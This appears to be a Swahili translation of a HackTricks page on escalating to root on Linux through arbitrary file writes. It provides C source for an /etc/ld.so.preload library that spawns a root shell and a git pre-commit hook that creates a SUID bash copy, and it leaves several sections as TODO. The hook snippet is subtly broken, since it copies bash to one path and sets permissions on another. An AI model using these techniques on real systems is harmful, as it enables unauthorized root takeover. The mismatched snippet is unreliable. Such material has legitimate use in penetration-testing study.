# Kuandika Faili ya Kiholela kwa Root

{% hint style="success" %}
Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks ya Mtaalam wa Timu Nyekundu ya GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>unga mkono HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### /etc/ld.so.preload

Faili hii inajitendea kama **`LD_PRELOAD`** mazingira ya env lakini pia inafanya kazi kwa **binari za SUID**.\
Ikiwa unaweza kuunda au kuhariri, unaweza tu kuongeza **njia ya maktaba itakayopakiwa** kila wakati binari inapotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Kanzidata ya Git

[**Kanzidata ya Git**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **maandishi** ambayo hutekelezwa katika matukio mbalimbali katika kanzidata ya git kama vile wakati wa kufanya commit, kufanya merge... Kwa hivyo, ikiwa **maandishi au mtumiaji mwenye mamlaka** anafanya vitendo hivi mara kwa mara na ni rahisi **kuandika katika folda ya `.git`**, hii inaweza kutumika kwa **privesc**.

Kwa mfano, Inawezekana **kuandika maandishi** katika kanzidata ya git katika **`.git/hooks`** ili iweze kutekelezwa daima wakati commit mpya inapotengenezwa:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Faili za Cron & Wakati

TODO

### Faili za Huduma & Soketi

TODO

### binfmt\_misc

Faili iliyoko katika `/proc/sys/fs/binfmt_misc` inaonyesha ni binary gani inapaswa kutekeleza aina gani ya faili. TODO: angalia mahitaji ya kutumia hii kutekeleza rev shell wakati aina ya kawaida ya faili inafunguliwa.
